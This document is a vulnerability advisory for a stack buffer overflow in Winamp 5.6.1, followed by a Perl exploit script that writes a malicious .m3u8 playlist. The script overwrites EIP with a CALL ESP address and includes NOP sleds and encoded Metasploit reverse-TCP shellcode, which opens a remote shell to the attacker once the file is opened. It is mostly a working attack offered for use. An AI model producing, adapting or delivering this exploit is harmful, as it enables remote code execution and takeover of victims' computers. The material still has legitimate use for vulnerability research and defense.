source: http://www.securityfocus.com/bid/47333/info

Winamp is prone to a remote buffer-overflow vulnerability because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.

Attackers can execute arbitrary code in the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

Winamp 5.6.1 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl

###
# Title : Winamp 5.6.1 (.m3u8) Stack Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com || ked-h@exploit-id.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : windows
# Impact : Stack Overflow
# Tested on : Windows XP sp3 FR
###
# Note : BAC 2011 Enchallah ( Me & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
##
# [»] ~ special thanks to : jos_ali_joe (exploit-id.com) , and All exploit-id Team
###

my $header = "#EXTM3U\n";
my $junk = "\x41" x 16240; # Buffer Junk
my $eip = "\xad\x86\x0e\x07"; # overwrite EIP - 070E86AD | FFD4 CALL ESP nde.dll
my $seh = pack('V',0x10017928);  # add ESP,4404 
$seh = $seh.pack('V',0x00000003); # Value de : EAX
$seh = $seh."\x41" x 11;
$seh = $seh.pack('V',0x41414141); # Value de : ECX
$seh = $seh."\x41" x 3;
$seh = $seh.pack('V',0x007EA478); # Value de : EDX
$seh = $seh."\x41" x 22;
$seh = $seh.pack('V',0x40000001); # Value de : EBX
$seh = $seh."\x41" x 8;
$seh = $seh.pack('V',0x028F1DB0); # Valeu de : ESP
$seh = $seh."\x41" x 12;
$seh = $seh.pack('V',0x77230459); # Valeu de : EBP
$seh = $seh."\x41" x 10;
$seh = $seh.pack('V',0x08FD62A8); # Valeu de : ESI
$seh = $seh."\x41" x 11;
$seh = $seh.pack('V',0x00497300); # Valeu de : EDI
$seh = $seh."\x41" x 2;
$seh = $seh.pack('V',0x08FD293C); # Valeu de : EIP
$seh = $seh."\x41" x 5;
my $nops = "\x90" x 100; # Nop
my $space = "\x41" x (43492 - length($junk) - length($nops));
my $shellcode = # windows/shell_reverse_tcp (http://www.metasploit.com)
"\x56\x54\x58\x36\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48" .
"\x50\x68\x59\x41\x41\x51\x68\x5a\x59\x59\x59\x59\x41\x41" .
"\x51\x51\x44\x44\x44\x64\x33\x36\x46\x46\x46\x46\x54\x58" .
"\x56\x6a\x30\x50\x50\x54\x55\x50\x50\x61\x33\x30\x31\x30" .
"\x38\x39\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41" .
"\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42" .
"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x4d" .
"\x38\x4e\x69\x47\x70\x43\x30\x45\x50\x45\x30\x4d\x59\x4a" .
"\x45\x45\x61\x48\x52\x43\x54\x4e\x6b\x50\x52\x50\x30\x4c" .
"\x4b\x51\x42\x46\x6c\x4e\x6b\x46\x32\x46\x74\x4c\x4b\x50" .
"\x72\x46\x48\x46\x6f\x4f\x47\x43\x7a\x51\x36\x46\x51\x49" .
"\x6f\x46\x51\x4f\x30\x4e\x4c\x47\x4c\x43\x51\x43\x4c\x43" .
"\x32\x44\x6c\x47\x50\x4f\x31\x48\x4f\x46\x6d\x43\x31\x49" .
"\x57\x48\x62\x4c\x30\x51\x42\x42\x77\x4c\x4b\x50\x52\x42" .
"\x30\x4c\x4b\x43\x72\x45\x6c\x46\x61\x4a\x70\x4c\x4b\x43" .
"\x70\x43\x48\x4e\x65\x4b\x70\x42\x54\x50\x4a\x45\x51\x48" .
"\x50\x46\x30\x4e\x6b\x50\x48\x45\x48\x4e\x6b\x51\x48\x51" .
"\x30\x45\x51\x48\x53\x48\x63\x47\x4c\x43\x79\x4e\x6b\x47" .
"\x44\x4e\x6b\x46\x61\x4b\x66\x50\x31\x4b\x4f\x44\x71\x4f" .
"\x30\x4e\x4c\x49\x51\x4a\x6f\x46\x6d\x46\x61\x4f\x37\x46" .
"\x58\x4d\x30\x42\x55\x4a\x54\x46\x63\x43\x4d\x4c\x38\x47" .
"\x4b\x51\x6d\x44\x64\x44\x35\x49\x72\x43\x68\x4c\x4b\x50" .
"\x58\x45\x74\x47\x71\x48\x53\x51\x76\x4e\x6b\x46\x6c\x42" .
"\x6b\x4c\x4b\x42\x78\x47\x6c\x45\x51\x48\x53\x4e\x6b\x45" .
"\x54\x4c\x4b\x47\x71\x48\x50\x4f\x79\x42\x64\x44\x64\x47" .
"\x54\x51\x4b\x51\x4b\x43\x51\x50\x59\x43\x6a\x46\x31\x4b" .
"\x4f\x4d\x30\x50\x58\x43\x6f\x43\x6a\x4c\x4b\x45\x42\x48" .
"\x6b\x4e\x66\x43\x6d\x42\x48\x50\x33\x44\x72\x45\x50\x43" .
"\x30\x51\x78\x42\x57\x42\x53\x46\x52\x43\x6f\x50\x54\x43" .
"\x58\x42\x6c\x44\x37\x44\x66\x45\x57\x49\x6f\x48\x55\x48" .
"\x38\x4c\x50\x47\x71\x45\x50\x47\x70\x47\x59\x4b\x74\x51" .
"\x44\x42\x70\x42\x48\x44\x69\x4d\x50\x42\x4b\x43\x30\x49" .
"\x6f\x48\x55\x50\x50\x42\x70\x50\x50\x42\x70\x47\x30\x42" .
"\x70\x43\x70\x50\x50\x43\x58\x48\x6a\x44\x4f\x49\x4f\x4d" .
"\x30\x49\x6f\x4b\x65\x4e\x69\x48\x47\x42\x48\x43\x4f\x45" .
"\x50\x43\x30\x47\x71\x43\x58\x43\x32\x45\x50\x44\x51\x43" .
"\x6c\x4e\x69\x4a\x46\x51\x7a\x42\x30\x51\x46\x43\x67\x42" .
"\x48\x4d\x49\x4e\x45\x51\x64\x51\x71\x49\x6f\x4e\x35\x50" .
"\x68\x42\x43\x42\x4d\x42\x44\x47\x70\x4c\x49\x48\x63\x51" .
"\x47\x51\x47\x51\x47\x50\x31\x4b\x46\x51\x7a\x47\x62\x51" .
"\x49\x50\x56\x4d\x32\x49\x6d\x50\x66\x4f\x37\x42\x64\x46" .
"\x44\x45\x6c\x47\x71\x43\x31\x4c\x4d\x50\x44\x51\x34\x42" .
"\x30\x4a\x66\x43\x30\x43\x74\x50\x54\x42\x70\x43\x66\x43" .
"\x66\x51\x46\x47\x36\x46\x36\x42\x6e\x50\x56\x46\x36\x42" .
"\x73\x43\x66\x50\x68\x44\x39\x48\x4c\x47\x4f\x4b\x36\x4b" .
"\x4f\x48\x55\x4c\x49\x4b\x50\x50\x4e\x42\x76\x43\x76\x49" .
"\x6f\x50\x30\x42\x48\x43\x38\x4c\x47\x47\x6d\x43\x50\x49" .
"\x6f\x4e\x35\x4f\x4b\x4a\x50\x4d\x65\x4d\x72\x51\x46\x51" .
"\x78\x4d\x76\x4e\x75\x4f\x4d\x4d\x4d\x4b\x4f\x48\x55\x47" .
"\x4c\x46\x66\x43\x4c\x45\x5a\x4b\x30\x49\x6b\x49\x70\x43" .
"\x45\x45\x55\x4d\x6b\x51\x57\x44\x53\x43\x42\x42\x4f\x51" .
"\x7a\x47\x70\x46\x33\x4b\x4f\x49\x45\x41\x41"; 
my $end = "\x90" x (20000 - $nops); # Nop sled
open(FILE,'>>KedAns.m3u8');
print FILE $header.$junk.$space.$seh.$nops.$eip.$shellcode.$end;
close(FILE);